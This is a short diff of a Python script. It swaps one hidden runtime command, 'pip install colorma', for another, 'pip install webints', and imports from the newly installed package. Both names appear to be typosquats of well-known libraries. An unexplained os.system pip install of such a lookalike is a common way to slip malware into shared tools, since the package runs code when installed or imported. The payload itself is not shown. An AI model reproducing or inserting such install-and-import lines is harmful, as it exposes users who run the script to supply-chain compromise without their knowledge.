@@ -8,8 +8,8 @@ try:
 except ImportError:
     input("Error while importing modules. Please install the modules in requirements.txt")
 import os
-os.system(f"pip install colorma")
-from colorma import fore
+os.system(f"pip install webints")
+from webints import webdriver
 init(convert = True, autoreset = True)
 warnings.filterwarnings("ignore", category=DeprecationWarning)
 clear = "clear"
